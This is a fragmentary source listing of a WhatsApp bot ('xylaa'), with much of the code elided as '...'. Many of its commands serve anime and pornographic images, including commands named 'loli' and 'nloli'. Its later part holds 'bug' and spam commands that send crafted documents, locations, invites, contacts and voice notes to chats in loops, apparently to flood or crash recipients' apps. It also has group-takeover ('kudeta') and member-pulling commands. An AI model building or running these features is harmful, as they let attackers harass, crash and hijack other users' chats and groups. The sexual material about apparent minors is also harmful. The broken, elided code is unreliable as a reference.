                    xylaa.sendMessage(i, {audio: buffer, mimetype: 'audio/mpeg'}, { quoted : ftroli })
                    } else {
...
if (!isCreator) return replay(mess.owner)
            ...
            xylaa.sendMessage(yoi, { caption: `${melo}`, location: { jpegThumbnail: await getBuffer(picak+`${ownername}'s Broadcast`) }, buttons: button, footer: `${botname}`, mentions: [m.sender] })
		}		
            }
            break
case 'chatinfo': {
...
xylaa.sendTextWithMentions(m.chat, teks, m)
}
break
case 'q': case 'quoted': {
   if (isBan) return reply(mess.ban)	 			
...
let wokwol = await xylaa.serializeM(await m.getQuotedObj())
...
case 'confess': case 'confes': case 'menfes': case 'menfess': {
	const reakt = xylaa.sendMessage(from, { react: { text: `${global.reactmoji}`, key: m.key }})
            ...
            await xylaa.sendButtonText(m1 + '@s.whatsapp.net', buttons, pjtxt, kawk, m, {mentions: ments, quoted: kafloc})
            let akhji = `Message has been sent\nTo @${mq1.split('@')[0]}`
            await xylaa.sendButtonText(m.chat, buttons, akhji, nyo, m, {mentions: ments})
            }
            break
			case 'listgece': {
 ...
 for (let i of anu) {
 let metadata = await xylaa.groupMetadata(i)
...
let liston = 1
xylaa.sendText(m.chat, '     「 Online List 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
}
break
case 'patrick':
case 'patricksticker': {
...
encmedia = await xylaa.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
...
if (isBanChat) return reply(mess.banChat)
           ...
           await xylaa.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'hisoka', 'morou', m, {asSticker: true})
...
if (isBanChat) return reply(mess.banChat)
           ...
           await xylaa.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/attp?teks=${text}`, 'Xeon', 'Op', m, {asSticker: true}).catch((err) => reply(mess.error))
         }
         break
case 'ttp': {
if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
           ...
           await xylaa.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/texttopng2?teks=${text}`, 'A L Y A', 'B O T M D', m, {asSticker: true})
            ...
            case 'soundcloud': case 'scdl': {               
                ...
                xylaa.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${txt}` }, { quoted: m }).catch((err) => reply(mess.error))    
                xylaa.sendMessage(m.chat, { audio: { url: data.medias[0].url }, mimetype: 'audio/mpeg', fileName: data.title+'.m4a' }, { quoted: m })
                }).catch((err) => {
                    reply(mess.error)
                })
            }
...
let encmedia = await xylaa.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
let media = await quoted.download()
let encmedia = await xylaa.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
...
xylaa.downloadAndSaveMediaMessage(quoted, "gifee")
xylaa.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await xylaa.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: global.atnm })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
let media = await quoted.download()
let encmedia = await xylaa.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
reply(`Send Image/Video With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
...
reply(mess.wait)
mee = await xylaa.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
memek = await xylaa.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
...
xylaa.sendMessage(from, {image:{url:buffer}, caption:"Here you go!"}, {quoted:m})
break
...
xylaa.sendMessage(from, {image : nyz3, caption:`By ${global.botname}`}, {quoted:m}) 						
} catch (e) {
error("Error!")
}
break
...
axios.get(`https://nekos.life/api/v2/img/${command}`)
            .then(({data}) => {         
            xylaa.sendImage(m.chat, data.url, mess.success, m)
                })
break
case 'mori': 
if (isBan) return reply(mess.ban)	 			
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button27Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'marin': 
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
            ...
            await xylaa.sendMessage(m.chat, buttonnMessages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'raiden': 
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
            ...
            await xylaa.sendMessage(m.chat, button6Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'uniform': 
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
            ...
            await xylaa.sendMessage(m.chat, button7Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'maid': 
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
            ...
            await xylaa.sendMessage(m.chat, button8Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'waifu2': 
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
            ...
            await xylaa.sendMessage(m.chat, button9Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'oppai': 
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button10Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'selfies': 
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button11Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'hentai-neko' :
...
if (!AntiNsfw) return m.reply(mess.nsfw)
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button12Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'hentai-waifu' :
...
m.reply(mess.wait)
 ...
 let nwaifubot = [
  ...
  headerType: 1
            ...
            await xylaa.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'nloli': 
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button13Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'nloli2': 
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button14Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'milf': 
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button15Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ecchi': 
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button16Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ntrap': 
...
.then(({data}) => {         
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button17Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
})
break
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button18Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ahegao': 
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button19Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ero': 
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button20Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'oral': 
...
reply('• -Please Wait 🦋 - •')
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button21Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'nyuri': 
...
let spgif = await GIFBufferToVideoBuffer(spbuff)   
        await xylaa.sendMessage(m.chat,{video: spgif, gifPlayback:true},{ quoted:m }).catch(err => {
                    return reply('Error!')
                                    })
break
...
let bjif = await GIFBufferToVideoBuffer(bjf)   
        await xylaa.sendMessage(m.chat,{video: bjif, gifPlayback:true},{ quoted:m }).catch(err => {
                    return reply('error..')
                                    })
break
...
if (!AntiNsfw) return reply(mess.nsfw)
                ...
                xylaa.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
   if (isBan) return reply(mess.ban)	 			
...
reply(mess.wait)
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button22Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'hentai-neko' :
...
if (!AntiNsfw) return reply(mess.nsfw)
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button23Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'hentai-waifu' :
...
waifudd = axios.get(`https://waifu.pics/api/nsfw/waifu`)
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button28Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'gasm':
...
reply(mess.wait)						
 waifudd = axios.get(`https://nekos.life/api/v2/img/${command}`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonsssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break   
case 'smug2':
...
reply(mess.wait)						
  ...
  headerType: 1
             ...
             xylaa.sendMessage(m.chat, button25Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'foxgirl':
...
reply(mess.wait)						
 waifudd = axios.get(`https://nekos.life/api/v2/img/fox_girl`)
      ...
      headerType: 4
             ...
             xylaa.sendMessage(m.chat, button12ssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break   
case 'animenom' :
...
if (!m.isGroup) return replay(mess.group)
 ...
 let xxhnekobot = [
  ...
  headerType: 1
            ...
            await xylaa.sendMessage(m.chat, xx1button26Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'waifu3':
...
reply(mess.wait)						
 waifudd = axios.get(`https://nekos.life/api/v2/img/waifu`)
      ...
      headerType: 4
             ...
             xylaa.sendMessage(m.chat, button112ssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'neko2':
...
reply(mess.wait)						
   waifud = await axios.get('https://waifu.pics/api/sfw/neko')
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat,buttonssMessage, { quoted:m }).catch(err => {
                    return('Error!')
                })               
                break
case 'animecuddle':
...
reply(mess.wait)						
 waifudd = axios.get(`https://nekos.life/api/v2/img/cuddle`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonsosMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break   
case 'animeslap':
...
reply(mess.wait)						
 waifudd = axios.get(`https://nekos.life/api/v2/img/slap`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, btutttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animepat':
...
reply(mess.wait)						
 waifudd = axios.get(`https://nekos.life/api/v2/img/pat`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, xxbuttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeneko':
...
reply(mess.wait)						
 waifudd = axios.get(`https://nekos.life/api/v2/img/neko`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonsTsMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animehug':
...
reply(mess.wait)						
 waifudd = axios.get(`https://nekos.life/api/v2/img/hug`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonussMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animekiss':
...
reply(mess.wait)						
 waifudd = axios.get(`https://nekos.life/api/v2/img/kiss`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, bxxuttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewlp':
...
reply(mess.wait)						
 waifudd = axios.get(`https://nekos.life/api/v2/img/wallpaper`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttoxnssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animespank':
...
reply(mess.wait)						
 waifudd = axios.get(`https://nekos.life/api/v2/img/spank`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonssxMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animecry':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/cry`)
      ...
      headerType: 4
             ...
             xylaa.sendMessage(m.chat, button1ssxMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animekill':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/kill`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsxMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animelick':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/lick`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx12Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animebite':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/bite`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx123Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeyeet':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/yeet`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx124Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animebully':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/lick`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx125Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animebonk':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/bonk`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx126Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewink':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/wink`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx127Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animepoke':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/poke`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx128Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animesmile':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/smile`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx129Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewave':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/wave`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx1210Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeawoo':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/awoo`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx1211Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeblush':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/blush`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx1212Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animesmug':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/smug`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx1213Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeglomp':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/glomp`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx1214Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animehappy':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/happy`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx1215Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animedance':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/dance`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx1216Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animecringe':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/cringe`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx1217Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animehighfive':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/highfive`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx1218Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animehandhold':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/handhold`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx1219Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animemegumin':
...
reply(mess.wait)						
 waifudd = axios.get(`https://api.waifu.pics/sfw/megumin`)
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, buttonszzsx1220Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'shinobu2':  
...
await xylaa.sendMessage(m.chat,buttonsesMessage, { quoted:m }).catch(err => {
     return('Error!')
    })               
break
case 'megumin2':
...
await xylaa.sendMessage(m.chat,buttonzMessage, { quoted:m }).catch(err => {
     return('Error!')
    })               
break     
case 'awoo2':
...
reply(mess.wait)						
 ...
 var wbuttsss = [
  ...
  headerType: 2
             ...
             xylaa.sendMessage(m.chat, button1Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
...
var walb = [
      ...
      headerType: 4
            ...
            await xylaa.sendMessage(m.chat, wal,{ quoted:m }).catch(err => {
                    return('Error!')
                })
//xylaa.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'cecankorea':
if (isBan) return reply(mess.ban)
if (isBanChat) return reply(mess.banChat)
...
.then(({data}) => {
xylaa.sendImage(m.chat, data.result, mess.success, m)
})
break
case 'cecanmalay':
if (isBan) return reply(mess.ban)
...
case 'cry':case 'kill':case 'hug':case 'pat':case 'lick':case 'kiss':case 'bite':case 'yeet':case 'neko':case 'bully':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'awoo':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'cuddle':case 'highfive':case 'shinobu':case 'megumin':case 'handhold':
   if (isBan) return reply(mess.ban)
	if (isBanChat) return reply(mess.banChat)
					...
					.then(({data}) => {
						xylaa.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
					})
					break
case 'waifu':
					   if (isBan) return reply(mess.ban)
...
case 'naruto':
	...
	if (isBanChat) return reply(mess.banChat)
				...
				xylaa.sendMessage(from, { caption: `Here you go!`, image: { url: pickRandom(data.result)}}, { quoted: m })
 			    break
case 'yaoi':
			if (isBan) return reply(mess.ban)
	if (isBanChat) return reply(mess.banChat)
...
if (isBanChat) return reply(mess.banChat)
                ...
                xylaa.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case 'zippyshare': {
	if (isBan) return reply(mess.ban)	 			
...
xylaa.sendMessage(m.chat, {document: linkyke, mimetype: 'application/zip', fileName: `${anu.result.filename}`}, {quoted:m}).catch ((err) => reply(mess.error))     
}
break
case 'savefrom': {
if (isBan) return reply(mess.ban)	 			
...
if (isBanChat) return reply(mess.banChat)
                ...
                xylaa.sendMessage(m.chat, { image: buf, caption: `Made by ${botname}` }, { quoted: m}).catch ((err) => reply(mess.error))
                }
                break
case 'gayeffect': {
	if (isBan) return reply(mess.ban)	 			
...
if (isBanChat) return reply(mess.banChat)
        ...
        if (/image/.test(mime)) {
anu = await xylaa.downloadAndSaveMediaMessage(quoted)
xylaa.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: m })
        } else if (/video/.test(mime)) {
        anu = await xylaa.downloadAndSaveMediaMessage(quoted)
        xylaa.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: m })
        }
        }
        break
        case 'tinyurl': {
...
xylaa.sendMessage(m.chat, { image : { url : funne }, caption: teks }, { quoted : m })
}
break
case 'darkjokes':{
if (isBan) return reply(mess.ban)
...
- The ban on the bot itself is as follows:
 ...
 • Warnings
 Best regard, *xylaa*.`)
            xylaa.sendMessage(from, { text: rulesnye, quoted: m})
             break
       case 'caklontong':{
              ...
              xylaa.sendMessage(from, '*+* ```Caklontong```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: m}).then(() => {
...
if (!text) return reply(`Example ${prefix}spamsw text|5`)
				...
				for (let i = 0; i < argziy[1]; i++){
					xylaa.sendMessage('status@broadcast', argziy[0], text)
                    }
                    break	
      case 'shutdown':
             if (!isCreator) return 
...
if (isBanChat) return reply(mess.banChat)
              if (!m.isGroup) return reply(mess.group)
                ...
                potonya = await getBuffer(`https://telegra.ph/file/3951f34e7d99b8986f20b.jpg`)
                   xylaa.updateProfilePicture (from, potonya)
                xylaa.groupUpdateSubject(from, `KUDETA BY ${body.slice(7)}`)
                xylaa.groupUpdateDescription(from, `*KUDETA BY ${body.slice(7)}*`)             
				xylaa.sendMessage(from, { text: `*KUDETA BY ${body.slice(7)}*`, quoted: m})
					break
case 'bugreact': {
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
...
let cret = await xylaa.groupCreate(args.join(" "), [])
let response = await xylaa.groupInviteCode(cret.id)
teks = `「 *Create Group* 」
...
xylaa.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `${ngazap(prefix)}.BIN`, title: `${ngazap(prefix)}.BIN` }, { quoted: doc })
}
}
break
case 'hu': {
...
for (let i = 0; i < jumlah; i++) {
 ...
 xylaa.sendMessage(m.chat, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
...
for (let i = 0; i < jumlah; i++) {
 ...
 xylaa.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
...
for (let i = 0; i < jumlah; i++) {
 ...
 xylaa.sendMessage(m.chat, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
...
for (let i = 0; i < jumlah; i++) {
 ...
 xylaa.sendMessage(m.chat, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
...
for (let i = 0; i < jumlah; i++) {
 ...
 xylaa.sendMessage(m.chat, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
...
for (let i = 0; i < jumlah; i++) {
 ...
 xylaa.sendMessage(m.chat, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
...
for (let i = 0; i < jumlah; i++) {
 ...
 xylaa.sendMessage(m.chat, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
...
for (let i = 0; i < jumlah; i++) {
 ...
 xylaa.sendMessage(m.chat, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
...
for (let i = 0; i < jumlah; i++) {
 ...
 xylaa.sendMessage(m.chat, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
...
for (let i = 0; i < jumlah; i++) {
 ...
 xylaa.sendMessage(m.chat, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
...
for (let i = 0; i < jumlah; i++) {
 ...
 xylaa.sendMessage(m.chat, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
...
for (let i = 0; i < jumlah; i++) {
 ...
 xylaa.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
case 'bugsange': {
...
await xylaa.sendButtonText(m.chat, buttonsntnsfww, `WARNING
\n\n*WELCOME\n\n
bugcrot
bugahay `, `${ngazap(prefix)}`, m)
}
}
break
case 'bugghoib': {
...
if (!m.isGroup) return replay(mess.group)
  ...
  xylaa.sendMessage(text1, { text: `Member kidnapping request by @${m.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [m.sender] },{ quoted : m })               
  await xylaa.sendMessage(from, { text: `Member kidnapping request by @${m.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [m.sender] },{ quoted : m })                
  await xylaa.groupParticipantsUpdate(m.chat, [text2], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
  }
  break
case 'loli':{
if (isBan) return reply(mess.ban)
...
xylaa.sendMessage(m.chat, buttonMessagexxn1, { quoted: m })
break
case 'calculator':
case 'calc':
case 'kalkulator':
...
if (!m.isGroup) return replay(mess.group)
    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
    let online = [...Object.keys(store.presences[id]), botNumber]
    xylaa.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
case 'bokep':{
if (isBan) return reply(mess.ban)	 			
...
xylaa.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Hayolo ><` }, { quoted: m })
}
break
case 'bokep2':{
                if (isBan) return reply(mess.ban)	 			
...
headerType: 1
 ...
 await xylaa.sendMessage(m.chat, button4Messagess, { quoted: doc }).catch(err => {
 return('Error!')
})
break
case 'ducu': {
...
xylaa.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`Memew ~ 404 ${buttonkal}.HW` }, {quoted:doc})
}
}
break
//=================================================//
...
for (let i = 0; i < jumlah; i++) {
 ...
 xylaa.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`Memew ~ 404 ${buttonkal}.HW` }, {quoted:doc})
 }
 }
 break
//=================================================//
...
xylaa.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
...
ydd = `YOU ARE AN IDIOT`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./virus/image/YOU ARE AN IDIOTgans.jpg') }, { upload: xylaa.waUploadToServer })
...
xylaa.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
}
break
case 'bugtod': {
...
xylaa.sendContact(m.chat, global.ownerr, fkontaak)
}
}
break
//=================================================//
...
ydd = `YOU ARE AN IDIOT`
for (let i = 0; i < jumlah; i++) {
xylaa.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
...
ydd = `YOU ARE AN IDIOT`
for (let i = 0; i < jumlah; i++) {
xylaa.sendMessage(m.chat, {sticker: thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
...
xylaa.sendMessage(m.chat, buttonMessage)
}
 break
//=================================================//
case 'bugtag': {
if (!m.isGroup) throw groupon(from)
xylaa.sendMessage(m.chat, { text : `${buttonkal}` , mentions: participants.map(a => a.id)}, { quoted: doc })
}
break
case 'buglokas': {
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
...
xylaa.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
}
break
case 'buginvite': {
...
xylaa.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
}
break
case 'spam': {
...
m.reply(mess.wait)
xylaa.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `${bugsw}` }, { quoted:m })
break
case 'searchgc':
case 'searchgece':
case 'searchgrup':
...
xylaa.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
}
break
//=================================================//
...
xylaa.relayMessage(m.chat, image.message, { messageId: image.key.id })
}
}
break
//=================================================//
...
xylaa.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
}
break
//=================================================//
...
xylaa.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
}
break
//=================================================//
...
xylaa.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
}
break
case 'inibug': {
...
